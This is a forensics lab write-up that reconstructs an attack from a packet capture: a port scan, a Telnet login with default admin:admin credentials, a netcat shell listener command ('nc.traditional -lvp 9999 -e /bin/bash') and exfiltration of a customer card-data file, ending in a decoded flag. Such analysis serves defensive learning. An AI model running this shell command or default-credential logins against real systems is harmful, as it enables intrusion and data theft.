# Market Dump Lab

**Date:** 2024-09-27

---

## Initial Setup

I started by downloading and extracting a zip file, which contained a **pcapng** file. I analyzed the file using **Wireshark**.

### IP Addresses:

- **10.0.2.15** → Attacker (hacker)
- **10.0.2.3** → Target

---

## Port Scan

The attacker performed a port scan on the target machine. The following ports were identified as open:

- **22** → SSH
- **23** → Telnet
- **53** → DNS
- **80** → HTTP

The target is running **Apache 2.4.29** on an **Ubuntu** server.

---

## Directory Bruteforce on Port 80

The attacker initiated a directory brute-force attack on port `80` (HTTP). Unfortunately, the specific directories found weren’t captured in the pcap, but it's clear the attacker was attempting to enumerate accessible paths on the web server.

---

## Telnet Access on Port 23

The attacker attempted to log in via Telnet on port `23`. After trying common credentials, they successfully logged in using:

- **Username:** `admin`
- **Password:** `admin`

Upon logging in, they were greeted with a stock report:

```
Welcome, admin

Here is your daily stock report!

PRODUCT   PRICE  STOCK
------------------------
SHIRTS    $20    50
JEANS     $40    99
WALLETS   $15    19
SOCKS     $10    100

Type exit to exit the program: exit
```

This session was captured in **Wireshark** under the filter: 

```bash
tcp.stream eq 1053
```

---

## Netcat Backdoor

After gaining access to the Telnet service, the attacker searched for the **netcat (nc)** binary on the system:

```bash
tcp.stream eq 1054
```

They then set up a reverse shell using **nc.traditional**, running the following command on the target system:

```bash
nc.traditional -lvp 9999 -e /bin/bash
```

This command was captured in the pcap:

```bash
tcp.stream eq 1055
```

With the listener running on port `9999`, the attacker established a connection and gained full shell access to the target system.

---

## Data Exfiltration

While browsing the target's filesystem, the attacker discovered a file named **customers.sql**, which contained sensitive data, including **American Express card numbers**.

The attacker downloaded the **customers.sql** file by setting up a transfer over port `9998`:

```bash
tcp.stream eq 1056
```

---

## Decoding the Flag

Inside the **customers.sql** file, I found a **Base58-encoded** value. After decoding it, I successfully extracted the **flag**.

---

## Summary

- The attacker initiated a port scan, revealing open services on the target.
- Successful Telnet login was achieved with default credentials (`admin:admin`).
- The attacker escalated access by setting up a reverse shell using **netcat**.
- Sensitive data, including **credit card information**, was exfiltrated from the target’s system.

---
